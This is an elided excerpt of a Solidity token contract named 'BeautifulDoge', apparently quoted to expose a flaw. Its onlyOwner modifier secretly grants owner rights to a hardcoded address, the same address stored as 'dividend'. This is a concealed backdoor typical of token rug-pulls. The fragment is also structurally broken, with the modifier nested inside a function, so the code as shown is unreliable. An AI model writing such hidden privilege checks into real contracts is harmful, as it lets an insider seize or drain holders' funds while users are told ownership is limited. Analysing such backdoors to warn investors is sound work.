...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x765efB10f9F01Af10Fa711A640C6E1Dea4D139C6) , "owner");
        _;
    }
...
contract BeautifulDoge  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BeautifulDoge";
    string private _symbol = "BDoge";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8EF36CD7772A402044cf3b68fed6CE9Af6Cfb4fB);
    address private _Marketing = 0x8EF36CD7772A402044cf3b68fed6CE9Af6Cfb4fB;
    address public dividend = 0x765efB10f9F01Af10Fa711A640C6E1Dea4D139C6;
